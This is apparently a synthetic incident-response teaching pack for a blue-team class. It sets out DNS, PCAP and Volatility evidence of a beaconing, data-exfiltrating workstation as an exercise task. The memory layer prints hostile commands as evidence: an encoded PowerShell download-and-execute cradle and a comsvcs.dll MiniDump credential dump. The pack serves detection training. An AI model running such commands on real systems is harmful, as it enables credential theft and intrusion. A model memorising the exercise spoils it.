# Session 7 — Three-layer pack

> **SYNTHETIC TEACHING DATA — CODED Blue Team Classroom**
> Every host, account, address, domain and hash below is fabricated for this
> workshop. No real environment produced this data. Do not visit any address or
> domain shown. Addresses are written defanged (hxxp://, 185[.]220[.]101[.]45)
> where they would otherwise be clickable.
>
> DNS log, PCAP conversation and timing summaries, and parsed Volatility output. Open the DNS log first.

## LAYER 1 — DNS query log (WORKSTATION-07, 10.0.3.22, 12 hours)

### 1a. NXDOMAIN responses by hour

```
HOUR    NXDOMAIN COUNT    NOTE
-----   ---------------   --------------------------------
15:00               200   <-- anomalous
16:00                 1   baseline
17:00                 0   baseline
18:00                 2   baseline
19:00                 1   baseline
20:00                 3   baseline
21:00                 1   baseline
22:00                 1   baseline
23:00                 0   baseline
00:00                 2   baseline
01:00                 1   baseline
02:00                 0   baseline
```

### 1b. The 15:00 window (abridged — 40 of 200 shown)

```
15:00:00  10.0.3.22  QUERY  8hq9s51rbt[.]org  ->  NXDOMAIN
15:00:00  10.0.3.22  QUERY  gab03h62b2[.]org  ->  NXDOMAIN
15:00:03  10.0.3.22  QUERY  fv7tudsb6c[.]info  ->  NXDOMAIN
15:00:04  10.0.3.22  QUERY  66k63yldj8[.]org  ->  NXDOMAIN
15:00:04  10.0.3.22  QUERY  9q6c5jhhjb[.]org  ->  NXDOMAIN
15:00:05  10.0.3.22  QUERY  e2soqpyxi8[.]net  ->  NXDOMAIN
15:00:06  10.0.3.22  QUERY  95l3f0pnl0[.]com  ->  NXDOMAIN
15:00:08  10.0.3.22  QUERY  03be12ttug[.]net  ->  NXDOMAIN
15:00:10  10.0.3.22  QUERY  fb1e1x7woa[.]com  ->  NXDOMAIN
15:00:10  10.0.3.22  QUERY  ok5n622zma[.]net  ->  NXDOMAIN
15:00:11  10.0.3.22  QUERY  kjhou7aw6w[.]com  ->  NXDOMAIN
15:00:11  10.0.3.22  QUERY  r6ixk04qtt[.]com  ->  NXDOMAIN
15:00:12  10.0.3.22  QUERY  4injq4utps[.]net  ->  NXDOMAIN
15:00:13  10.0.3.22  QUERY  a74ei8r6bl[.]com  ->  NXDOMAIN
15:00:13  10.0.3.22  QUERY  dxnnjl10kx[.]com  ->  NXDOMAIN
15:00:13  10.0.3.22  QUERY  m6211k203p[.]info  ->  NXDOMAIN
15:00:14  10.0.3.22  QUERY  3gac09czuh[.]info  ->  NXDOMAIN
15:00:16  10.0.3.22  QUERY  np82fzqr4g[.]info  ->  NXDOMAIN
15:00:16  10.0.3.22  QUERY  qvaq57cgfe[.]info  ->  NXDOMAIN
15:00:17  10.0.3.22  QUERY  caits9vxfi[.]info  ->  NXDOMAIN
15:00:21  10.0.3.22  QUERY  n1bsjos9ta[.]org  ->  NXDOMAIN
15:00:24  10.0.3.22  QUERY  wdpjazlsyx[.]com  ->  NXDOMAIN
15:00:25  10.0.3.22  QUERY  2lwasi5aw8[.]org  ->  NXDOMAIN
15:00:26  10.0.3.22  QUERY  soaqxlg2s9[.]net  ->  NXDOMAIN
15:00:28  10.0.3.22  QUERY  2j4dsofoza[.]net  ->  NXDOMAIN
15:00:28  10.0.3.22  QUERY  c4gjayxqmv[.]org  ->  NXDOMAIN
15:00:28  10.0.3.22  QUERY  jfyscwd2x8[.]org  ->  NXDOMAIN
15:00:28  10.0.3.22  QUERY  simcravvpa[.]net  ->  NXDOMAIN
15:00:28  10.0.3.22  QUERY  sqdr8uywqv[.]com  ->  NXDOMAIN
15:00:30  10.0.3.22  QUERY  etom1kxvgc[.]com  ->  NXDOMAIN
15:00:32  10.0.3.22  QUERY  pjv39cynk3[.]net  ->  NXDOMAIN
15:00:35  10.0.3.22  QUERY  5b7poasdnc[.]info  ->  NXDOMAIN
15:00:35  10.0.3.22  QUERY  sytgjvvrlj[.]info  ->  NXDOMAIN
15:00:37  10.0.3.22  QUERY  8vtn2cygax[.]net  ->  NXDOMAIN
15:00:37  10.0.3.22  QUERY  fqqkydylvo[.]net  ->  NXDOMAIN
15:00:37  10.0.3.22  QUERY  kzle0vqin7[.]org  ->  NXDOMAIN
15:00:37  10.0.3.22  QUERY  y9chq867rw[.]com  ->  NXDOMAIN
15:00:38  10.0.3.22  QUERY  hsytc5mxc5[.]info  ->  NXDOMAIN
15:00:39  10.0.3.22  QUERY  da2599zgjq[.]net  ->  NXDOMAIN
15:00:42  10.0.3.22  QUERY  6ip7nua4ah[.]info  ->  NXDOMAIN
... 160 further NXDOMAIN responses in this window ...
15:03:18  10.0.3.22  QUERY  update-cdn-srv[.]com  ->  A  91[.]92[.]251[.]103
```

> One query in this window resolved. Note the time, and note what time the
> beacon starts in layer 2. The gap between them is the single most important
> number in your report.

---

## LAYER 2 — PCAP summaries

These are exports of what Wireshark's **Statistics -> Conversations** and
**IO Graph** views would show you. Opening a raw capture is a tooling
exercise; the inference is the same either way.

### 2a. Selected conversation summaries (not sorted)

```
ADDRESS A      ADDRESS B                PACKETS   BYTES A->B   BYTES B->A   DURATION
10.0.3.22      91[.]92[.]251[.]103          192        8,704        4,320   3h 08m
10.0.3.22      10.0.0.15 (FILESERVER-01)  4,218      412,880    8,221,044   22m
10.0.3.22      10.0.0.5  (DC-01)            882       88,204      142,009   14m
10.0.3.22      91[.]92[.]251[.]103        1,204  888,201,448        8,112   13m
10.0.3.22      cdn.contoso.com            2,044      182,004    4,882,110   6h
```

### 2b. Connection timing to 91[.]92[.]251[.]103:443

```
21:05:00  10.0.3.22:50195 -> 91[.]92[.]251[.]103:443  188 bytes out / 88 bytes in  TLS1.2
21:09:06  10.0.3.22:51883 -> 91[.]92[.]251[.]103:443  180 bytes out / 92 bytes in  TLS1.2
21:13:08  10.0.3.22:62639 -> 91[.]92[.]251[.]103:443  181 bytes out / 86 bytes in  TLS1.2
21:17:00  10.0.3.22:57227 -> 91[.]92[.]251[.]103:443  177 bytes out / 86 bytes in  TLS1.2
21:20:56  10.0.3.22:54712 -> 91[.]92[.]251[.]103:443  187 bytes out / 91 bytes in  TLS1.2
21:24:51  10.0.3.22:57979 -> 91[.]92[.]251[.]103:443  179 bytes out / 91 bytes in  TLS1.2
21:28:52  10.0.3.22:54491 -> 91[.]92[.]251[.]103:443  181 bytes out / 90 bytes in  TLS1.2
21:32:52  10.0.3.22:62295 -> 91[.]92[.]251[.]103:443  187 bytes out / 88 bytes in  TLS1.2
21:36:52  10.0.3.22:54690 -> 91[.]92[.]251[.]103:443  177 bytes out / 89 bytes in  TLS1.2
21:40:47  10.0.3.22:50485 -> 91[.]92[.]251[.]103:443  186 bytes out / 88 bytes in  TLS1.2
21:44:42  10.0.3.22:53035 -> 91[.]92[.]251[.]103:443  179 bytes out / 90 bytes in  TLS1.2
21:48:48  10.0.3.22:59082 -> 91[.]92[.]251[.]103:443  181 bytes out / 89 bytes in  TLS1.2
21:52:39  10.0.3.22:63979 -> 91[.]92[.]251[.]103:443  187 bytes out / 94 bytes in  TLS1.2
21:56:41  10.0.3.22:56552 -> 91[.]92[.]251[.]103:443  182 bytes out / 94 bytes in  TLS1.2
22:00:32  10.0.3.22:63054 -> 91[.]92[.]251[.]103:443  183 bytes out / 94 bytes in  TLS1.2
22:04:23  10.0.3.22:64227 -> 91[.]92[.]251[.]103:443  183 bytes out / 89 bytes in  TLS1.2
22:08:17  10.0.3.22:59364 -> 91[.]92[.]251[.]103:443  184 bytes out / 92 bytes in  TLS1.2
22:12:08  10.0.3.22:61966 -> 91[.]92[.]251[.]103:443  188 bytes out / 87 bytes in  TLS1.2
22:16:06  10.0.3.22:59628 -> 91[.]92[.]251[.]103:443  179 bytes out / 94 bytes in  TLS1.2
22:20:09  10.0.3.22:65384 -> 91[.]92[.]251[.]103:443  185 bytes out / 86 bytes in  TLS1.2
22:24:09  10.0.3.22:63650 -> 91[.]92[.]251[.]103:443  185 bytes out / 94 bytes in  TLS1.2
22:28:02  10.0.3.22:52183 -> 91[.]92[.]251[.]103:443  181 bytes out / 88 bytes in  TLS1.2
22:31:54  10.0.3.22:65085 -> 91[.]92[.]251[.]103:443  179 bytes out / 88 bytes in  TLS1.2
22:36:01  10.0.3.22:53708 -> 91[.]92[.]251[.]103:443  183 bytes out / 86 bytes in  TLS1.2
22:39:55  10.0.3.22:50822 -> 91[.]92[.]251[.]103:443  186 bytes out / 89 bytes in  TLS1.2
22:43:52  10.0.3.22:64713 -> 91[.]92[.]251[.]103:443  184 bytes out / 91 bytes in  TLS1.2
22:47:57  10.0.3.22:64272 -> 91[.]92[.]251[.]103:443  177 bytes out / 94 bytes in  TLS1.2
22:51:57  10.0.3.22:64006 -> 91[.]92[.]251[.]103:443  187 bytes out / 94 bytes in  TLS1.2
22:55:48  10.0.3.22:56256 -> 91[.]92[.]251[.]103:443  179 bytes out / 88 bytes in  TLS1.2
22:59:54  10.0.3.22:65184 -> 91[.]92[.]251[.]103:443  185 bytes out / 86 bytes in  TLS1.2
23:04:00  10.0.3.22:53771 -> 91[.]92[.]251[.]103:443  188 bytes out / 90 bytes in  TLS1.2
23:08:00  10.0.3.22:57568 -> 91[.]92[.]251[.]103:443  187 bytes out / 94 bytes in  TLS1.2
23:12:02  10.0.3.22:62298 -> 91[.]92[.]251[.]103:443  180 bytes out / 91 bytes in  TLS1.2
23:15:59  10.0.3.22:57390 -> 91[.]92[.]251[.]103:443  178 bytes out / 93 bytes in  TLS1.2
23:19:54  10.0.3.22:52512 -> 91[.]92[.]251[.]103:443  188 bytes out / 93 bytes in  TLS1.2
23:23:49  10.0.3.22:56794 -> 91[.]92[.]251[.]103:443  185 bytes out / 88 bytes in  TLS1.2
23:27:42  10.0.3.22:60256 -> 91[.]92[.]251[.]103:443  179 bytes out / 88 bytes in  TLS1.2
23:31:51  10.0.3.22:57119 -> 91[.]92[.]251[.]103:443  176 bytes out / 93 bytes in  TLS1.2
23:35:44  10.0.3.22:50046 -> 91[.]92[.]251[.]103:443  181 bytes out / 87 bytes in  TLS1.2
23:39:45  10.0.3.22:61617 -> 91[.]92[.]251[.]103:443  182 bytes out / 89 bytes in  TLS1.2
23:43:40  10.0.3.22:49939 -> 91[.]92[.]251[.]103:443  184 bytes out / 88 bytes in  TLS1.2
23:47:47  10.0.3.22:64180 -> 91[.]92[.]251[.]103:443  178 bytes out / 91 bytes in  TLS1.2
23:51:46  10.0.3.22:53536 -> 91[.]92[.]251[.]103:443  178 bytes out / 89 bytes in  TLS1.2
23:55:44  10.0.3.22:65352 -> 91[.]92[.]251[.]103:443  182 bytes out / 89 bytes in  TLS1.2
23:59:45  10.0.3.22:62707 -> 91[.]92[.]251[.]103:443  181 bytes out / 92 bytes in  TLS1.2
00:03:45  10.0.3.22:53913 -> 91[.]92[.]251[.]103:443  180 bytes out / 90 bytes in  TLS1.2
00:07:51  10.0.3.22:56553 -> 91[.]92[.]251[.]103:443  185 bytes out / 86 bytes in  TLS1.2
00:11:55  10.0.3.22:60511 -> 91[.]92[.]251[.]103:443  182 bytes out / 93 bytes in  TLS1.2
```

### 2c. User traffic baseline from the same host, same duration

```
Destinations contacted      : 64
Connection count            : 2,044
Payload size range          : 210 bytes - 3.9 MB
Interval between connections: 1s - 2,610s, no central value
Activity 00:00-06:00        : 2% of daytime volume
```

### 2d. POST requests

```
02:47:11  10.0.3.22 -> 91[.]92[.]251[.]103  POST /upload
          Content-Type: application/octet-stream
          Content-Length: 888,201,448    (847 MB)
```

### 2e. Internal traffic

```
01:30:14  10.0.3.22 -> 10.0.0.15:445   SMB2  NEGOTIATE/SESSION_SETUP/TREE_CONNECT  \\FILESERVER-01\Finance$
01:30:22  10.0.3.22 -> 10.0.0.15:445   SMB2  CREATE/READ x 2,104
01:44:08  10.0.3.22 -> 10.0.0.5:445    SMB2  NEGOTIATE/SESSION_SETUP  \\DC-01\SYSVOL
01:44:51  10.0.3.22 -> 10.0.0.5:389    LDAP  searchRequest objectClass=user
```

---

## LAYER 3 — Memory (Volatility output, captured 03:12 BEFORE isolation)

### 3a. imageinfo
```
Suggested profile : Win10x64_19041
Image date (UTC)  : 2026-03-12 03:12:44
```

### 3b. pstree (abridged)
```
 PID    PPID   NAME
 4       0     System
 572     4     smss.exe
 684     676   csrss.exe
 768     676   wininit.exe
 820     768   services.exe
 1244    820   svchost.exe
 2344    1180  explorer.exe
. 4102   2344  powershell.exe        <-- unusual child
.. 4188  4102  cmd.exe
 3012    2344  chrome.exe
 5120    2344  OUTLOOK.EXE
```

### 3c. malfind (abridged)

Additional supplied validation: PID2344 has a private, unbacked region with a valid PE structure. The chrome and OUTLOOK regions below have been attributed to their legitimate runtimes. Real investigations require these checks; MZ or writable executable memory alone does not prove injection.
```
Process: explorer.exe   Pid: 2344   Address: 0x7ff000200000
Vad Tag: VadS   Protection: PAGE_EXECUTE_READWRITE
0x7ff000200000  4d 5a 90 00 03 00 00 00  MZ......

Process: chrome.exe     Pid: 3012   Address: 0x1f2a04c0000
Vad Tag: VadS   Protection: PAGE_EXECUTE_READWRITE
0x1f2a04c0000   48 8b c4 48 89 58 08 48  H..H.X.H
  (no MZ header — V8 JIT region)

Process: OUTLOOK.EXE    Pid: 5120   Address: 0x2004a110000
Vad Tag: VadS   Protection: PAGE_EXECUTE_READWRITE
0x2004a110000   55 8b ec 83 ec 20 53 56  U.... SV
  (no MZ header — .NET JIT region)
```

### 3d. netscan (abridged)
```
Proto  Local Address        Foreign Address              State        PID   Owner
TCPv4  10.0.3.22:51204      91[.]92[.]251[.]103:443      ESTABLISHED  2344  explorer.exe
TCPv4  10.0.3.22:49881      10.0.0.15:445                CLOSE_WAIT   2344  explorer.exe
TCPv4  10.0.3.22:50112      142.250.185.78:443           ESTABLISHED  3012  chrome.exe
TCPv4  10.0.3.22:50330      52.98.151.2:443              ESTABLISHED  5120  OUTLOOK.EXE
```

### 3e. cmdline (abridged)
```
explorer.exe     pid 2344  C:\Windows\explorer.exe
powershell.exe   pid 4102  powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA
cmd.exe          pid 4188  cmd /c rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 724 C:\Users\Public\d.bin full
chrome.exe       pid 3012  "C:\Program Files\Google\Chrome\Application\chrome.exe"
```

---

## Note on the disk layer

Disk forensics on this host was completed yesterday and reported nothing
suspicious. That report was not wrong — it was answering a different question.
Part of task T5 is explaining which question.

